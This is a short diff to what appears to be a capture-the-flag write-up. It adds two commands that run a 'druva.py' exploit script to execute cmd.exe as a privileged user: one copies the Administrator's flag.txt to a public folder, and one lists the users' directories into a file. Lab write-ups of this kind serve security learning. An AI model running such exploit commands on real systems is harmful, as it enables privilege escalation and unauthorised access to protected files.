@@ -347,3 +347,10 @@ PS C:\Windows\system32>
 PS C:\Users\Administrator\Desktop> type root.txt
 ```
 
+```
+C:\python27\druva.py "C:\windows\system32\cmd.exe /C copy C:/Users/Administrator/Desktop/flag.txt C:/Users/public"
+```
+
+```
+C:\python27\druva.py "windows\system32\cmd.exe /C dir C:/Users > C:/Users/Public/test.txt"
+```
